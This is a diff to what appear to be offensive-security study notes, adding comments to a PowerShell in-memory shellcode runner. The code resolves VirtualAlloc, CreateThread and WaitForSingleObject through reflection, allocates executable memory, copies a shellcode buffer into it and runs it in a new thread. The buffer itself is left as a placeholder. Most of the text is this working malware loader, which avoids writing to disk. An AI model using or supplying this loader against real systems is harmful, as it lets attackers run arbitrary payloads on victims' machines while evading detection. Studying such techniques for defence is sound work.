@@ -26,6 +26,9 @@ we can also try and use .txt extension
 
 Complete PowerShell script for in-memory shellcode runner
 
+		***<comment>Method wrapper to create a delegate type: accepts two arguments: the function arguments of the Win32 API given as an array and its return type. The first block creates the custom assembly and defines the module and type 
+  			inside of it. The second block of code sets up the constructor, and the third sets up the invoke method. Finally, the constructor is invoked and the delegate type is returned to the caller.<comment>***
+
 		function LookupFunc {
 		
 			Param ($moduleName, $functionName)
@@ -62,16 +65,23 @@ Complete PowerShell script for in-memory shellcode runner
 		
 			return $type.CreateType()
 		}
-		
-		$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+		***<comment>Resolving and calling VirtualAlloc through reflection<comment>***
+    
+		$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 
+  				0x40)
 		
 		[Byte[]] $buf = generated shell code
 		
 		[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
-		
+
+  		***<comment>Resolving and calling CreateThread through reflection<comment>***
+    
 		$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) 	
   			([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
-		
+
+  		***<comment>Resolving and calling WaitForSingleObject through reflection<comment>***
+    
 		[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
   
 
